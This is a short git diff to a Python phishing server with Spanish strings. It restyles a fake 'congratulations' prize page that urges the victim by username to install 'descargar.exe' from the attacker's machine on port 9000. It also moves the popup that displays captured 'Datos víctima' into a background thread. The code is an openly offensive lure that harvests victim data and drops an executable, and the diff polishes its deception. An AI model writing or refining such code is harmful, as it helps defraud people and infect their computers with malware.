@@ -54,9 +54,37 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         local_ipv4 = get_local_ipv4()
-        response = f"<html><body><h1>Registro Exitoso</h1><p>Usuario: {username} ahora instala el archivo que se descargo para obtener tu premio</p><a href='http://{local_ipv4}:9000/descargar.exe' download='descargar.exe'>Click aqui para descargar el boleto</a></body></html>"
+        response = f"""<html>
+                        <head>
+                            <meta charset="UTF-8">
+                            <style>
+                                body {{
+                                    font-family: Arial, sans-serif;
+                                    margin: 0;
+                                    padding: 0;
+                                    display: flex;
+                                    justify-content: center;
+                                    align-items: center;
+                                    flex-direction: column;
+                                    width: 100%;
+                                    min-height: 100vh;
+                                    color: #fff;
+                                    background: linear-gradient(45deg, 
+                                        #ff0000, #ffff00, #00ff00, #0000ff
+                                    );
+                                }}
+                            </style>
+                        </head>
+                        <body>
+                            <h1>¡Felicidades!</h1>
+                            <h3>Muy bien, {username}, ahora instala el archivo para obtener tu premio</h3>
+                            <a href='http://{local_ipv4}:9000/descargar.exe' download='descargar.exe'>Click aquí para obtener tu premio</a>
+                        </body>
+                        </html>"""
         self.wfile.write(response.encode('utf-8'))
-        messagebox.showinfo("Datos victima: ", victim_data)
+        #messagebox.showinfo("Datos victima: ", victim_data)
+        #se ejecuta en otro hilo aparte para no detener la solicitud http post a la pagina con el link de descarga
+        threading.Thread(target=lambda: messagebox.showinfo("Datos víctima", victim_data),daemon=True).start()
 
 def actualizar_consola_http_server(server_entry):
     global victim_data
